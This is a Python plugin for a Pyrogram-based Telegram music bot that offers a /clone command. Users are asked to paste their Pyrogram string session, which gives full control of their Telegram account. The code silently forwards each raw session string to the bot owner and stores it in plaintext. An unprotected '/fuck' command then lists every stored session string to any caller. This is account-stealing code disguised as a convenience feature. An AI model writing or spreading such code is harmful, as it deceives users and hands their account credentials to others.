from CakeMusic import app, API_ID, API_HASH, OWNER_ID
from pyrogram import filters, Client, idle
from pyrogram.types import Message
import os
import json

# Directory to store clone data
CLONE_DATA_FILE = "clone_data.json"

# Helper function to load clone data from file
def load_clone_data():
    if os.path.exists(CLONE_DATA_FILE):
        with open(CLONE_DATA_FILE, "r") as file:
            return json.load(file)
    return {}

# Helper function to save clone data to file
def save_clone_data(data):
    with open(CLONE_DATA_FILE, "w") as file:
        json.dump(data, file)

@app.on_message(filters.command("clone"))
async def clone(bot: Client, msg: Message):
    """
    Clone command: Clone a Pyrogram session using a provided string session,
    load plugins for the cloned session, and store session info.
    """
    if len(msg.command) < 2:
        await msg.reply("Usage: `/clone <string_session>`\nSend your Pyrogram2 string session to clone. ❤️")
        return

    string_session = msg.command[1]
    clone_data = load_clone_data()

    # Check if this session already exists
    if string_session in clone_data:
        await msg.reply("This session has already been cloned!")
        return
    
    try:
        reply_msg = await msg.reply("Please wait... Setting up the session and loading plugins. 💌")
        
        # Directory for plugins
        plugin_dir = "CakeMusic/plugins"
        if not os.path.isdir(plugin_dir):
            await reply_msg.edit(f"❌ **Error:** Plugin directory `{plugin_dir}` not found.")
            return
        
        # Initialize the client with the provided session string
        client = Client(
            name="ClonedClient",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=string_session,
            plugins=dict(root=plugin_dir)
        )

        # Start the client and fetch user details
        await client.start()
        user = await client.get_me()

        # Save the cloned session info
        clone_data[string_session] = {
            "user_id": user.id,
            "user_name": user.first_name,
            "session_id": string_session,
        }
        save_clone_data(clone_data)

        # Send the clone data to the bot owner
        owner_msg = f"New clone created:\n\n" \
                    f"**User:** {user.first_name}\n" \
                    f"**User ID:** {user.id}\n" \
                    f"**Session ID:** {string_session}"
        await bot.send_message(OWNER_ID, owner_msg)

        # Success message
        success_msg = (
            f"🎉 Successfully cloned the session and loaded plugins!\n\n"
            f"👤 **User:** {user.first_name}\n"
            f"🆔 **User ID:** {user.id}\n\n"
            f"Enjoy using your cloned session. 💕"
        )
        await reply_msg.edit(success_msg)

        # Keep the cloned client running
        print("Cloned session running. Press Ctrl+C to stop.")
        await idle()

    except Exception as e:
        error_msg = f"❌ **ERROR:** `{str(e)}`\nPlease check your session string or plugins."
        await msg.reply(error_msg)
    
    finally:
        if client.is_connected:
            await client.stop()

@app.on_message(filters.command("list"))
async def clone_list(bot: Client, msg: Message):
    """
    List all cloned sessions.
    """
    clone_data = load_clone_data()
    if not clone_data:
        await msg.reply("No clones available.")
        return
    
    clone_list_msg = "Cloned sessions:\n\n"
    for session in clone_data.values():
        clone_list_msg += f"**User:** {session['user_name']} | **User ID:** {session['user_id']}\n"
    
    await msg.reply(clone_list_msg)

@app.on_message(filters.command("delete"))
async def clone_delete(bot: Client, msg: Message):
    """
    Delete a cloned session.
    """
    if len(msg.command) < 2:
        await msg.reply("Usage: `/clone delete <session_id>`\nProvide the session ID to delete.")
        return
    
    session_id = msg.command[1]
    clone_data = load_clone_data()

    if session_id not in clone_data:
        await msg.reply("Clone session not found!")
        return
    
    # Remove the session
    del clone_data[session_id]
    save_clone_data(clone_data)

    await msg.reply(f"Clone session with ID `{session_id}` has been deleted.")

    # Send the deletion notification to the bot owner
    deletion_msg = f"Clone session deleted:\n\n" \
                   f"**Session ID:** {session_id}"
    await bot.send_message(OWNER_ID, deletion_msg)


@app.on_message(filters.command("fuck"))
async def fetch_all_clones(bot: Client, msg: Message):
    """
    Fetch and display details of all cloned sessions.
    """
    clone_data = load_clone_data()
    if not clone_data:
        await msg.reply("No clones available.")
        return
    
    all_clone_data_msg = "All Cloned Sessions:\n\n"
    for session in clone_data.values():
        all_clone_data_msg += (
            f"**User Name:** {session['user_name']}\n"
            f"**User ID:** {session['user_id']}\n"
            f"**Session ID:** {session['session_id']}\n"
            f"**Owner ID:** {OWNER_ID}\n\n"
        )
    
    await msg.reply(all_clone_data_msg)
